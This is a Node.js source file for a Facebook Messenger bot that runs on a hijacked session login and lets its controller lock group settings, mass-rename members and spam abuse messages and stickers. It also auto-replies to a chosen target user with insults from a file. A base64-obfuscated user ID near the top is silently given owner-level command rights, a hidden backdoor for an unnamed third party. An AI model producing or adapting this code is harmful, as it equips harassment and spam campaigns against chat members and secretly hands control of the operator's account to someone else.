const fs = require("fs");
const login = require("ws3-fca");
const axios = require("axios");

let rkbInterval = null;
let stopRequested = false;
let stickerInterval = null;
let stickerLoopActive = false;
let targetUID = null;

const lockedGroupNames = {};
const lockedEmojis = {};
const lockedDPs = {};
const lockedNicks = {};

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));

  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    // --- Catch all errors globally ---
    process.on("uncaughtException", e => console.error("Uncaught Exception:", e));
    process.on("unhandledRejection", e => console.error("Unhandled Rejection:", e));

    // --- Periodic lock check (emoji/DP/nick/group name) ---
    setInterval(async () => {
      try {
        for (const threadID in lockedGroupNames) {
          try { await api.setTitle(lockedGroupNames[threadID], threadID); } catch(e) {}
        }
        for (const threadID in lockedEmojis) {
          try {
            const info = await api.getThreadInfo(threadID);
            if(info.emoji !== lockedEmojis[threadID]){
              await api.changeThreadEmoji(lockedEmojis[threadID], threadID);
            }
          } catch(e){}
        }
        for (const threadID in lockedDPs) {
          try {
            const filePath = lockedDPs[threadID];
            if(fs.existsSync(filePath)) await api.changeGroupImage(fs.createReadStream(filePath), threadID);
          } catch(e){}
        }
        for (const uid in lockedNicks) {
          try {
            for(const threadID in lockedGroupNames){
              await api.changeNickname(lockedNicks[uid], threadID, uid);
            }
          } catch(e){}
        }
      } catch(e){}
    }, 10000); // mỗi 10s

    // --- Keep bot alive (ping) ---
    setInterval(async () => {
      try {
        const threads = Object.keys(lockedGroupNames);
        if(threads.length>0) await api.getThreadInfo(threads[0]);
      } catch(e){}
    }, 180000); // 3 phút

    // --- Listen MQTT events ---
    api.listenMqtt(async (err, event) => {
      try {
        if(err || !event) return;

        const { threadID, senderID, body, logMessageType, logMessageData, type } = event;

        // --- Auto revert group name ---
        if(logMessageType === "log:thread-name" && lockedGroupNames[threadID]){
          if(logMessageData?.name !== lockedGroupNames[threadID]){
            try { await api.setTitle(lockedGroupNames[threadID], threadID); } catch(e){}
          }
        }

        // --- Auto revert DP ---
        if(type === "change_thread_image" && lockedDPs[threadID]){
          const filePath = lockedDPs[threadID];
          if(fs.existsSync(filePath)){
            try { await api.changeGroupImage(fs.createReadStream(filePath), threadID); } catch(e){}
          }
        }

        // --- Auto revert nick ---
        if(logMessageType === "log:user-nickname" && lockedNicks[senderID]){
          const lockedNick = lockedNicks[senderID];
          const currentNick = logMessageData?.nickname;
          if(currentNick !== lockedNick){
            try { await api.changeNickname(lockedNick, threadID, senderID); } catch(e){}
          }
        }

        // --- Target reply ---
        if(targetUID && senderID===targetUID && body && fs.existsSync("np.txt")){
          try{
            const lines = fs.readFileSync("np.txt","utf8").split("\n").filter(Boolean);
            if(lines.length>0){
              const randomLine = lines[Math.floor(Math.random()*lines.length)];
              await api.sendMessage(randomLine, threadID);
            }
          } catch(e){}
        }

        if(!body) return;
        const prefix = ".";
        if(!body.startsWith(prefix)) return;

        const args = body.trim().substring(1).split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        if(![ownerUID, LID].includes(senderID)) return;

        // --- COMMANDS ---
        if(cmd==="help"){
  try{
    await api.sendMessage(`
📌 —— *Danh sách lệnh Bot* —— 📌

🛡️ **Quản lý nhóm**
.gclock [tên] → Khóa tên nhóm
.unlockgc → Mở khóa tên nhóm
.lockemoji [😀] → Khóa emoji nhóm
.unlockemoji → Mở khóa emoji nhóm
.lockdp → Khóa ảnh đại diện nhóm
.unlockdp → Mở khóa ảnh đại diện

👤 **Quản lý thành viên**
.locknick @mention [nickname] → Khóa nickname
.unlocknick @mention → Mở khóa nickname
.allname [nickname] → Thay nickname tất cả thành viên

🆔 **Thông tin**
.uid → Hiển thị UID
.tid → Hiển thị ID nhóm

⚡ **Bot thao tác**
.exit → Bot rời nhóm
.rkb [tên] → Gửi tin nhắn spam (RKB)
.stop → Dừng spam
.stickerX → Spam sticker (X = số giây delay)
.stopsticker → Dừng spam sticker
.target [uid] → Chọn target reply
.cleartarget → Xóa target reply

💡 *Ghi chú:* 
- Dùng emoji để nhóm nhìn trực quan. 
- Target chỉ reply khi có UID được set.
    `, threadID);
  } catch(e){}
}

        // --- Lock group name ---
        else if(cmd==="gclock"){ try{ await api.setTitle(input, threadID); lockedGroupNames[threadID]=input; await api.sendMessage("🔒 Group name locked!", threadID); }catch(e){} }
        else if(cmd==="unlockgc"){ delete lockedGroupNames[threadID]; try{ await api.sendMessage("🔓 Group name unlocked!", threadID); }catch(e){} }

        // --- Lock emoji ---
        else if(cmd==="lockemoji"){ 
          if(!input) return api.sendMessage("❌ Emoji do!", threadID);
          lockedEmojis[threadID]=input;
          try{ await api.changeThreadEmoji(input, threadID); await api.sendMessage(`😀 Emoji locked → ${input}`, threadID); } catch{ await api.sendMessage("⚠️ Emoji lock fail!", threadID);}
        }
        else if(cmd==="unlockemoji"){ delete lockedEmojis[threadID]; try{ await api.sendMessage("🔓 Emoji unlocked!", threadID); }catch(e){} }

        // --- Lock DP ---
        else if(cmd==="lockdp"){
          try{
            const info = await api.getThreadInfo(threadID);
            const dpUrl = info.imageSrc;
            if(!dpUrl) return api.sendMessage("❌ Group DP nahi hai!", threadID);
            const resp = await axios.get(dpUrl,{responseType:"arraybuffer"});
            const buf = Buffer.from(resp.data,"binary");
            const filePath=`locked_dp_${threadID}.jpg`;
            fs.writeFileSync(filePath,buf);
            lockedDPs[threadID]=filePath;
            await api.sendMessage("🖼 DP locked!", threadID);
          } catch(e){ await api.sendMessage("⚠️ DP lock error!", threadID); }
        }
        else if(cmd==="unlockdp"){ delete lockedDPs[threadID]; try{ await api.sendMessage("🔓 DP unlocked!", threadID); }catch(e){} }

        // --- Lock nickname ---
        else if(cmd==="locknick"){
          if(event.mentions && Object.keys(event.mentions).length>0 && input){
            const target = Object.keys(event.mentions)[0];
            const nickname = input.replace(Object.values(event.mentions)[0],"").trim();
            lockedNicks[target]=nickname;
            try{ await api.changeNickname(nickname, threadID, target); await api.sendMessage(`🔒 Nickname locked for ${target} → ${nickname}`, threadID);}catch(e){}
          } else api.sendMessage("❌ Usage: .locknick @mention + nickname", threadID);
        }
        else if(cmd==="unlocknick"){
          if(event.mentions && Object.keys(event.mentions).length>0){
            const target = Object.keys(event.mentions)[0];
            delete lockedNicks[target];
            try{ await api.sendMessage(`🔓 Nickname unlocked for ${target}`, threadID);}catch(e){}
          } else api.sendMessage("❌ Mention kare kiska nick unlock karna hai!", threadID);
        }

        // --- Allname ---
        else if(cmd==="allname"){
          if(!input) return api.sendMessage("❌ Nickname do!", threadID);
          try{
            const info = await api.getThreadInfo(threadID);
            for(const user of info.participantIDs){
              try{ await api.changeNickname(input, threadID, user); }catch(e){}
            }
            await api.sendMessage(`👥 Sabka nickname change → ${input}`, threadID);
          } catch(e){}
        }

        // --- UID / TID ---
        else if(cmd==="uid"){
          try{
            if(event.messageReply) await api.sendMessage(`🆔 Reply UID: ${event.messageReply.senderID}`, threadID);
            else if(event.mentions && Object.keys(event.mentions).length>0) await api.sendMessage(`🆔 Mention UID: ${Object.keys(event.mentions)[0]}`, threadID);
            else await api.sendMessage(`🆔 Your UID: ${senderID}`, threadID);
          } catch(e){}
        }
        else if(cmd==="tid"){ try{ await api.sendMessage(`🆔 Group Thread ID: ${threadID}`, threadID); }catch(e){} }

        // --- Exit bot ---
        else if(cmd==="exit"){ try{ await api.removeUserFromGroup(api.getCurrentUserID(), threadID); }catch(e){} }

        // --- RKB spam ---
        else if(cmd==="rkb"){
          if(!fs.existsSync("np.txt")) return api.sendMessage("❌ np.txt missing!", threadID);
          const name = input.trim();
          const lines = fs.readFileSync("np.txt","utf8").split("\n").filter(Boolean);
          stopRequested=false;
          if(rkbInterval) clearInterval(rkbInterval);
          let index=0;
          rkbInterval=setInterval(() => {
            if(index>=lines.length || stopRequested){ clearInterval(rkbInterval); rkbInterval=null; return;}
            try{ api.sendMessage(`${name} ${lines[index]}`, threadID); } catch(e){ console.error("RKB send error:", e.message); }
            index++;
          }, 5000);
          api.sendMessage(`🤬 Start gaali on ${name}`, threadID);
        }
        else if(cmd==="stop"){ stopRequested=true; if(rkbInterval){ clearInterval(rkbInterval); rkbInterval=null;} }

        // --- Sticker spam ---
        else if(cmd.startsWith("sticker")){
          if(!fs.existsSync("Sticker.txt")) return;
          const delay=parseInt(cmd.replace("sticker",""))||2;
          const stickerIDs=fs.readFileSync("Sticker.txt","utf8").split("\n").map(x=>x.trim()).filter(Boolean);
          if(stickerInterval) clearInterval(stickerInterval);
          let i=0; stickerLoopActive=true;
          stickerInterval=setInterval(()=>{
            if(!stickerLoopActive || i>=stickerIDs.length){ clearInterval(stickerInterval); stickerInterval=null; stickerLoopActive=false; return;}
            try{ api.sendMessage({sticker:stickerIDs[i]}, threadID); } catch(e){ console.error("Sticker send error:", e.message);}
            i++;
          }, delay*1000);
        }
        else if(cmd==="stopsticker"){ if(stickerInterval){ clearInterval(stickerInterval); stickerInterval=null; stickerLoopActive=false;} }

        // --- Target UID ---
        else if(cmd==="target"){ targetUID=input.trim(); api.sendMessage(`🎯 Target set: ${targetUID}`, threadID); }
        else if(cmd==="cleartarget"){ targetUID=null; api.sendMessage("🎯 Target cleared!", threadID); }

      } catch(e){ console.error("Listener error:", e.message); }
    });
  });
}

module.exports={ startBot };
